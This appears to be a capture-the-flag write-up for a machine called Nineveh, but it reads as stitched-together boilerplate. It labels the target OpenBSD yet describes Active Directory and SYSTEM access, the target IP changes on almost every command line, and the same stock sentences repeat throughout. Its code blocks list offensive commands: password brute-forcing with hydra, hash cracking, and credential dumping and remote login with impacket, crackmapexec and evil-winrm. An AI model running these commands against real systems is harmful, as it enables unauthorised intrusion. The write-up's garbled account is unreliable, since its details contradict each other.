---
TitleSEO: "PwnTillDawn — Nineveh (Insane OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Nineveh (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Nineveh. Command Injection and Docker Escape to achieve insane compromise on OpenBSD."
Keywords: "insane, active directory, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-nineveh-602.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-nineveh-602/"
Date: "2025-12-24"
Tags: "Insane, Active Directory, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-nineveh-602"
Permalink: "/writeups/htb-nineveh-602.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Nineveh** is rated **Insane** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.24.111.102`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.27.226.235 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p139,3268,993 10.28.96.56 -oN scan.txt
gobuster dir -u http://10.96.37.20/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.101.141.108 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

```bash
evil-winrm -i 10.101.101.75 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.199.56 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p993,995,3306 10.82.189.110 -oN scan.txt
```

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.17.131.130/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p80,8443,3306 10.114.21.12 -oN scan.txt
crackmapexec smb 10.126.156.157 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **Docker Escape**.

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

### Initial Access

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.129.101.103
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.21.179
nmap -sCV -p80,587,389 10.19.101.245 -oN scan.txt
```

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code.

```powershell
feroxbuster -h
```

### Exploitation

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.92.109.234/FUZZ
```

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `lookupsid`
- `GetNPUsers`
- `ligolo-ng`
- `evil-winrm`

### Key Takeaways

- Command Injection
- Docker Escape
- SSRF
- Pass the Ticket
